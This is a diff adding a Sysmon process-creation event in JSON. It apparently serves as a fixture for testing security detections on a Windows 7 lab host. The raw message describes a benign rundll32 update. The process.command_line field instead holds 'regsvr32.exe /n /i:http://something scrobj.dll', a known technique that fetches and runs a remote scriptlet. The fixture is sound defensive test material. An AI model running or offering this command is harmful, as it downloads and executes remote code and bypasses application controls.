@@ -1,0 +1,135 @@
+{
+  "@timestamp": "2021-02-04T22:52:26.378Z",
+  "user": {
+    "domain": "NT AUTHORITY",
+    "name": "SYSTEM"
+  },
+  "related": {
+    "user": "SYSTEM",
+    "hash": [
+      "51138beea3e2c21ec44d0932c71762a8",
+      "5ad3c37e6f2b9db3ee8b5aeedc474645de90c66e3d95f8620c48102f1eba4124"
+    ]
+  },
+  "hash": {
+    "md5": "51138beea3e2c21ec44d0932c71762a8",
+    "sha256": "5ad3c37e6f2b9db3ee8b5aeedc474645de90c66e3d95f8620c48102f1eba4124"
+  },
+  "event": {
+    "category": [
+      "process"
+    ],
+    "type": [
+      "start",
+      "process_start"
+    ],
+    "kind": "event",
+    "code": 1,
+    "provider": "Microsoft-Windows-Sysmon",
+    "action": "Process Create (rule: ProcessCreate)",
+    "created": "2021-02-04T22:52:27.758Z",
+    "module": "sysmon"
+  },
+  "host": {
+    "ip": [
+      "192.168.56.101",
+      "172.16.1.1",
+      "fe80::5efe:c0a8:3865",
+      "fe80::5efe:ac10:101"
+    ],
+    "mac": [
+      "00:50:56:00:03:01",
+      "00:50:56:00:00:01",
+      "00:00:00:00:00:00:00:e0",
+      "00:00:00:00:00:00:00:e0"
+    ],
+    "name": "CLIENT1.breach.local",
+    "hostname": "CLIENT1",
+    "architecture": "x86",
+    "os": {
+      "name": "Windows 7 Professional",
+      "kernel": "6.1.7601.18741 (win7sp1_gdr.150202-1526)",
+      "build": "7601.0",
+      "platform": "windows",
+      "version": "6.1",
+      "family": "windows"
+    },
+    "id": "19fc45ac-5890-4f96-81b1-50ed111c0ce4"
+  },
+  "message": "Process Create:\nRuleName: \nUtcTime: 2021-02-04 22:52:26.378\nProcessGuid: {19FC45AC-7AAA-601C-0000-0010B60A0600}\nProcessId: 1884\nImage: C:\\Windows\\System32\\rundll32.exe\nFileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\nDescription: Windows host process (Rundll32)\nProduct: Microsoft\u00ae Windows\u00ae Operating System\nCompany: Microsoft Corporation\nOriginalFileName: RUNDLL32.EXE\nCommandLine: C:\\Windows\\system32\\rundll32.exe aepdu.dll,AePduRunUpdate\nCurrentDirectory: C:\\Windows\\system32\\\nUser: NT AUTHORITY\\SYSTEM\nLogonGuid: {19FC45AC-768F-601C-0000-0020E7030000}\nLogonId: 0x3e7\nTerminalSessionId: 0\nIntegrityLevel: System\nHashes: MD5=51138BEEA3E2C21EC44D0932C71762A8,SHA256=5AD3C37E6F2B9DB3EE8B5AEEDC474645DE90C66E3D95F8620C48102F1EBA4124\nParentProcessGuid: {19FC45AC-768F-601C-0000-0010EE630000}\nParentProcessId: 440\nParentImage: C:\\Windows\\System32\\services.exe\nParentCommandLine: C:\\Windows\\system32\\services.exe",
+  "process": {
+    "pid": 1884,
+    "name": "rundll32.exe",
+    "entity_id": "{19FC45AC-7AAA-601C-0000-0010B60A0600}",
+    "command_line": "regsvr32.exe /n /i:http://something scrobj.dll",
+    "working_directory": "C:\\Windows\\system32\\",
+    "parent": {
+      "executable": "C:\\Windows\\System32\\services.exe",
+      "command_line": "C:\\Windows\\system32\\services.exe",
+      "name": "services.exe",
+      "args": [
+        "C:\\Windows\\system32\\services.exe"
+      ],
+      "entity_id": "{19FC45AC-768F-601C-0000-0010EE630000}",
+      "pid": 440
+    },
+    "args": [
+      "C:\\Windows\\system32\\rundll32.exe",
+      "aepdu.dll,AePduRunUpdate"
+    ],
+    "hash": {
+      "md5": "51138beea3e2c21ec44d0932c71762a8",
+      "sha256": "5ad3c37e6f2b9db3ee8b5aeedc474645de90c66e3d95f8620c48102f1eba4124"
+    },
+    "executable": "C:\\Windows\\System32\\regsvr32.exe"
+  },
+  "log": {
+    "level": "information"
+  },
+  "winlog": {
+    "record_id": 1373,
+    "task": "Process Create (rule: ProcessCreate)",
+    "channel": "Microsoft-Windows-Sysmon/Operational",
+    "opcode": "Info",
+    "process": {
+      "thread": {
+        "id": 1716
+      },
+      "pid": 1928
+    },
+    "event_data": {
+      "TerminalSessionId": "0",
+      "Description": "Windows host process (Rundll32)",
+      "LogonGuid": "{19FC45AC-768F-601C-0000-0020E7030000}",
+      "OriginalFileName": "RUNDLL32.EXE",
+      "Company": "Microsoft Corporation",
+      "Product": "Microsoft\u00ae Windows\u00ae Operating System",
+      "IntegrityLevel": "System",
+      "LogonId": "0x3e7",
+      "FileVersion": "6.1.7600.16385 (win7_rtm.090713-1255)"
+    },
+    "event_id": 1,
+    "provider_name": "Microsoft-Windows-Sysmon",
+    "api": "wineventlog",
+    "user": {
+      "domain": "NT AUTHORITY",
+      "type": "User",
+      "identifier": "S-1-5-18",
+      "name": "SYSTEM"
+    },
+    "computer_name": "CLIENT1.breach.local",
+    "provider_guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
+    "version": 5
+  },
+  "ecs": {
+    "version": "1.5.0"
+  },
+  "agent": {
+    "ephemeral_id": "486f7872-9118-4349-8630-511973cdbf72",
+    "id": "c58de8d4-8be2-444c-bc20-92fab97cbaf5",
+    "name": "CLIENT1",
+    "type": "winlogbeat",
+    "version": "7.10.2",
+    "hostname": "CLIENT1"
+  }
+}
